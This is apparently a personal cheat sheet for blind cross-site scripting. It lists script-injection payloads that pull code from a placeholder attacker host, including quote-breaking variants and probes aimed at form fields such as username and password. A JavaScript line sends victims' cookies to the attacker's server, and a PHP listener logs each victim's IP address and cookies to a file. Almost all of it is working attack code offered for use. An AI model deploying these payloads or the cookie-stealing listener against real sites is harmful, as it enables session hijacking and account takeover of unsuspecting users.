Send request to server 
```html
<script src="http://OUR_IP/script.js"></script>
```
Send request with parameter name
```html
<script src="http://OUR_IP/username"></script>
```

Example payloads
```html
<script src=http://OUR_IP></script>

'><script src=http://OUR_IP></script>

"><script src=http://OUR_IP></script>

javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')

<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>

<script>$.getScript("http://OUR_IP")</script>
```


Script.js(Makes request to our php endpoint)
```javascript
<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>
```


PHP Listener Source
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```


"><script src="http://10.10.14.41/fullname"></script>
"><script src="http://10.10.14.41/username"></script>
"><script src="http://10.10.14.41/password"></script>
"><script src="http://10.10.14.41/email"></script>
"><script src="http://10.10.14.41/profilePIC"></script>

"><script src="http://10.10.14.41:80/script.js"></script>